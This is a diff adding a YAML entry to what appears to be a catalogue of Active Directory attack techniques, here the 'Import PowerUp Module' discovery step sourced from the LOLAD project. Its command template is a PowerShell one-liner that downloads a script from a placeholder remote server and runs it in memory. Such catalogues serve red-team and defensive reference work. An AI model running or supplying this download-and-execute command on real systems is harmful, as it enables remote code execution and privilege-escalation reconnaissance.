@@ -1,0 +1,24 @@
+id: lolad/import-powerup-module
+type: technique
+platform: active-directory
+name: Import PowerUp Module
+phases:
+- discovery
+capabilities:
+- discovery
+privilege_required: domain-user
+sources:
+- project: LOLAD
+  upstream_url: https://lolad-project.github.io
+  license: verify upstream LICENSE
+  upstream_version: 6ed6a25
+  last_synced: '2026-08-25'
+commands:
+- template: powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://remoteserver/PowerUp.ps1');
+    Invoke-AllChecks"
+references:
+- https://lolad-project.github.io
+tags:
+- active-directory
+- lolad
+- powershell
